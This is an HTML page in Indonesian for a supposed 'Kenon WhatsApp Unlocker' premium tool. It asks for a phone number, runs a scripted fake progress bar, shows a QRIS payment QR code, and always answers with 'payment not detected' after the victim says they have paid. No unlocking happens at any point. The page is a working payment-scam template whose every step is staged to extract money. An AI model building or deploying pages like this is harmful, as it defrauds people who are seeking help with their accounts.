<!doctype html>
<html lang="id" class="h-full">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Kenon WhatsApp Unlocker</title>

<script src="https://cdn.tailwindcss.com/3.4.17"></script>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">

<style>
*{font-family:'Poppins',sans-serif}
.gradient-bg{background:linear-gradient(135deg,#0a0a0a 0%,#1a1a2e 50%,#16213e 100%)}
.glass-card{background:rgba(255,255,255,.05);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.1)}
.glow-green{box-shadow:0 0 40px rgba(37,211,102,.4)}
.glow-text{text-shadow:0 0 20px rgba(37,211,102,.5)}
.btn-glow{background:linear-gradient(135deg,#25D366 0%,#128C7E 100%);box-shadow:0 4px 20px rgba(37,211,102,.4);transition:.3s}
.btn-glow:hover{transform:translateY(-2px);box-shadow:0 6px 25px rgba(37,211,102,.6)}
.progress-bar{background:linear-gradient(90deg,#25D366,#128C7E,#25D366);background-size:200% 100%;animation:shimmer 2s infinite linear}
@keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
.particle{position:absolute;width:4px;height:4px;background:#25D366;border-radius:50%;opacity:.3}
</style>
</head>

<body class="h-full gradient-bg text-white overflow-auto">

<div id="particles" class="fixed inset-0 pointer-events-none overflow-hidden"></div>

<div class="min-h-full flex flex-col items-center py-8 px-4 relative z-10">

<div class="text-center mb-8">
<div class="w-20 h-20 bg-gradient-to-br from-green-400 to-green-600 rounded-full flex items-center justify-center glow-green mx-auto mb-3">
<svg class="w-10 h-10 text-white" fill="currentColor" viewBox="0 0 24 24">
<path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347"/>
</svg>
</div>

<h1 class="text-3xl font-bold glow-text">Kenon WhatsApp</h1>
<p class="text-gray-400 text-sm">Premium Unlock Tool v3.2.1</p>
<p class="text-gray-500 text-xs mt-1">Â©2025 Unlock Kenon WhatsApp</p>
</div>

<div class="w-full max-w-md glass-card rounded-3xl p-6">

<div id="status-section" class="text-center mb-6">
<div class="inline-flex items-center gap-2 bg-yellow-500/20 text-yellow-400 px-4 py-2 rounded-full text-sm">
<span class="w-2 h-2 bg-yellow-400 rounded-full animate-pulse"></span>
<span id="status-text">Menunggu Verifikasi</span>
</div>
<p class="text-gray-400 text-sm mt-2">Masukkan nomor WhatsApp untuk memulai</p>
</div>

<div id="input-section">
<label class="text-sm text-gray-300">Nomor WhatsApp</label>
<input id="phone-input" type="tel" placeholder="812xxxx" class="w-full bg-white/5 border border-white/10 rounded-xl py-4 px-4 mt-2 mb-4 text-white">
<button onclick="startUnlock()" class="w-full btn-glow py-4 rounded-xl font-semibold">Mulai Unlock</button>
</div>

<div id="progress-section" class="hidden">
<div class="flex justify-between text-sm mb-2">
<span class="text-gray-400">Memproses...</span>
<span id="progress-percent" class="text-green-400">0%</span>
</div>
<div class="h-2 bg-white/10 rounded-full overflow-hidden">
<div id="progress-bar" class="h-full progress-bar" style="width:0%"></div>
</div>
</div>

<div id="payment-section" class="hidden text-center mt-6">
<h3 class="font-bold mb-3">Scan QRIS</h3>
<img src="https://files.catbox.moe/5jgk6a.jpg" class="w-48 h-48 mx-auto rounded-lg mb-4">
<button onclick="verifyPayment()" class="w-full btn-glow py-4 rounded-xl font-semibold">Sudah Bayar</button>
</div>

<div id="loading-section" class="hidden text-center mt-6">
<p class="text-gray-400 mb-3">Memverifikasi pembayaran...</p>
<div class="flex justify-center gap-2">
<div class="w-3 h-3 bg-green-400 rounded-full animate-pulse"></div>
<div class="w-3 h-3 bg-green-400 rounded-full animate-pulse"></div>
<div class="w-3 h-3 bg-green-400 rounded-full animate-pulse"></div>
</div>
</div>

<div id="payment-error-section" class="hidden text-center mt-6">
<p class="text-red-400 mb-4">Pembayaran tidak terdeteksi</p>
<button onclick="resetForm()" class="bg-white/10 px-4 py-2 rounded">Kembali</button>
</div>

</div>
</div>

<script>
function createParticles(){
const container=document.getElementById('particles');
for(let i=0;i<25;i++){
const p=document.createElement('div');
p.className='particle';
p.style.left=Math.random()*100+'%';
p.style.top=Math.random()*100+'%';
p.style.animation=`float ${3+Math.random()*4}s infinite`;
container.appendChild(p);
}}
createParticles();

function startUnlock(){
const phone=document.getElementById('phone-input').value.trim();
if(phone.length<9)return alert('Nomor tidak valid');

document.getElementById('input-section').classList.add('hidden');
document.getElementById('progress-section').classList.remove('hidden');

let progress=0;
const int=setInterval(()=>{
progress+=10;
document.getElementById('progress-bar').style.width=progress+'%';
document.getElementById('progress-percent').innerText=progress+'%';
if(progress>=100){
clearInterval(int);
showPayment();
}
},400);
}

function showPayment(){
document.getElementById('progress-section').classList.add('hidden');
document.getElementById('payment-section').classList.remove('hidden');
}

function verifyPayment(){
document.getElementById('payment-section').classList.add('hidden');
document.getElementById('loading-section').classList.remove('hidden');

setTimeout(()=>{showPaymentError()},15000);
}

function showPaymentError(){
document.getElementById('loading-section').classList.add('hidden');
document.getElementById('payment-error-section').classList.remove('hidden');
}

function resetForm(){location.reload()}
</script>

</body>
</html>
